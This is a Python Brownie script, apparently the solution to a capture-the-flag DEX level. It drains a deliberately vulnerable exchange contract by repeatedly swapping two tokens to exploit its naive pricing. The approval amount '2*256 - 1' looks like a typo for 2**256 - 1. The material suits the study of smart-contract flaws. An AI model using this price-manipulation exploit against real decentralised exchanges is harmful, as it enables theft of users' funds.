from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import Dex

##########################################
# The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        dex = load_challenge(ContractObject=Dex, instance_key='dex')
    else:
        dex = deploy_locally(ContractObject=Dex, from_account=_from)

    # use the convenient approve method in dex
    dex.approve(dex.address, 2*256 - 1, _from)

    # token 1 and token 2 addresses
    tk1 = dex.token1()
    tk2 = dex.token2()
    
    # perform swaps to abuse the ratios
    switch = {True: {1: tk1, 2: tk2}, False: {1: tk2, 2: tk1}}

    # count steps
    steps = 0

    # start loop, break if one of the balances reaches zero
    while True:

        # increase step
        c = steps % 2 == 0
        steps += 1

        # my balance of TK1 and TK2 depending on the loop
        my_bal = dex.balanceOf(switch[c][1], acc.address)

        # function to check balances
        dex_bal1 = lambda: dex.balanceOf(switch[c][1], dex.address)
        dex_bal2 = lambda: dex.balanceOf(switch[c][2], dex.address)

        # perform action
        if (my_bal < dex_bal1()):
            dex.swap(switch[c][1], switch[c][2], my_bal, _from)
        else:
            dex.swap(switch[c][1], switch[c][2], dex_bal1(), _from)
        
        # check if we are done
        if dex_bal1() == 0 or dex_bal2() == 0:
            break

    # check that we have effectively drained at least one of the tokens
    balance_assertion = (dex.balanceOf(tk1, dex.address) == 0) or (dex.balanceOf(tk2, dex.address) == 0)
    print(f"Token1 balance: {dex.balanceOf(tk1,dex.address)}")
    print(f"Token2 balance: {dex.balanceOf(tk2,dex.address)}")
    print(f"at least one side is drained: {balance_assertion}")

    return balance_assertion

def main():
    solve_challenge()
